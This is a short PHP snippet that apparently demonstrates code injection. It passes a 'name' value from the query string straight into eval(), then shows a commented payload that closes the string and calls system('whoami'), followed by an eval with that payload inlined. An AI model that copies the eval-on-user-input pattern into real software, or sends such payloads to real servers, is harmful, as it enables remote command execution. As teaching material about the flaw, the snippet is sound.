<?php
  $str="echo \"Hello ".$_GET['name']."!!!\";";
  eval($str);

  //Payload " . system('whoami');// 
  $str1="echo \"Hello "." . system('whoami');//!!!";
  eval($str1)
?>